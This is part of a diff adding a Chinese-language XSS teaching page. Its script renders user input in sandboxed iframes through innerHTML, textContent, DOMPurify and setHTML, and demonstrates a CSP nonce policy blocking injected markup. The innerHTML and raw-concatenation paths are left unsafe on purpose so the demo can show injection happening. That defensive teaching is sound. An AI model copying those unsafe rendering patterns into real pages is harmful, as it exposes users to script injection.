+    <li>给一个使用 <code>innerHTML</code> 的小项目开启 Trusted Types（Chromium 中测试），观察报错位置，并用一个统一的策略修复它们。</li>
+  </ol>
+</div>
+
+<div id="pager"></div>
+</main>
+</div>
+<script src="assets/site.js"></script>
+<script
+  src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.4.16/purify.min.js"
+  integrity="sha512-flQmhkXNRQ3iUfvtdCobtpMjCb6kE+zLnTiAulAQJ3WykVfy84JvCMOo6vhwWXHTXjR25h9Zj+LyGFRWKjRoag=="
+  crossorigin="anonymous"
+  referrerpolicy="no-referrer"></script>
+<script>
+(function () {
+  var input = document.getElementById('xss-input'), frame = document.getElementById('xss-frame'), status = document.getElementById('xss-status');
+  var cspFrame = document.getElementById('csp-frame'), cspStatus = document.getElementById('csp-status');
+  var executed = false, cspExecuted = false;
+  function escapeHtml(s) { return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;'); }
+
+  window.addEventListener('message', function (e) {
+    // 两个沙箱 iframe 都是不透明源（origin 为 "null"），所以这里用 source 判断消息来自哪个 iframe
+    if (e.data === 'xss' && e.source === frame.contentWindow) {
+      executed = true;
+      status.innerHTML = '<span class="alarm">⚠ 注入的脚本执行了！</span>（它运行在沙箱中，所以没有伤害本页；在真实页面里它可以读取你的数据）';
+    }
+    if (e.source === cspFrame.contentWindow) {
+      if (e.data === 'xss') { cspExecuted = true; cspStatus.innerHTML = '<span class="alarm">⚠ 脚本执行了（CSP 没有生效）</span>'; }
+      else if (e.data && e.data.type === 'violation') {
+        cspStatus.innerHTML = '<span class="safe">✓ CSP 拦截了注入：</span> securitypolicyviolation 事件，violatedDirective = <code>' +
+          escapeHtml(e.data.directive) + '</code>';
+      }
+    }
+  });
+
+  // 沙箱页面的外壳：把「渲染方式」对应的代码放进去，在 iframe 内部执行
+  function shell(renderScript) {
+    return '<!doctype html><meta charset="utf-8"><style>body{font:15px/1.6 system-ui,sans-serif;margin:10px;color:#222}</style>' +
+      '<div id="out"></div><script>' + renderScript + '<\/script>';
+  }
+
+  document.querySelectorAll('[data-mode]').forEach(function (b) {
+    b.onclick = function () {
+      var html = input.value, mode = b.dataset.mode, js;
+      executed = false;
+      var payload = JSON.stringify(html).replace(/</g, '\\u003c');
+      if (mode === 'innerHTML') {
+        js = 'document.getElementById("out").innerHTML = ' + payload + ';';
+      } else if (mode === 'textContent') {
+        js = 'document.getElementById("out").textContent = ' + payload + ';';
+      } else if (mode === 'dompurify') {
+        if (!window.DOMPurify) { status.textContent = 'DOMPurify 未能加载（需要联网；如果 CDN 文件被篡改，SRI 校验也会阻止它加载）'; return; }
+        var clean = window.DOMPurify.sanitize(html);
+        js = 'document.getElementById("out").innerHTML = ' + JSON.stringify(clean).replace(/</g, '\\u003c') + ';';
+        status.textContent = '清洗后的 HTML：' + clean;
+      } else {
+        js = 'var o=document.getElementById("out");if("setHTML" in Element.prototype){o.setHTML(' + payload + ');}' +
+             'else{o.textContent="你的浏览器还不支持 Element.setHTML()（Sanitizer API），请改用 DOMPurify";}';
+      }
+      if (mode !== 'dompurify') status.textContent = mode === 'innerHTML' ? '已用 innerHTML 渲染……' : '已渲染，注入的脚本没有执行 ✓';
+      frame.srcdoc = shell(js);
+      if (mode === 'innerHTML') setTimeout(function () { if (!executed) status.textContent = '已用 innerHTML 渲染（等待 onerror 触发……）'; }, 400);
+    };
+  });
+
+  document.getElementById('csp-run').onclick = function () {
+    cspExecuted = false;
+    cspStatus.textContent = '加载中……';
+    // 注入的内容直接出现在 HTML 中（模拟服务器把未转义的评论输出到页面）
+    cspFrame.srcdoc = '<!doctype html><meta charset="utf-8">' +
+      '<meta http-equiv="Content-Security-Policy" content="script-src \'nonce-demo\'">' +
+      '<style>body{font:15px/1.6 system-ui,sans-serif;margin:10px;color:#222}</style>' +
+      '<script nonce="demo">document.addEventListener("securitypolicyviolation",function(e){parent.postMessage({type:"violation",directive:e.violatedDirective},"*")});<\/script>' +
+      '<p>下面是一条被原样输出的「评论」：</p>' + input.value;
+  };
+})();
+</script>
+</body>
+</html>
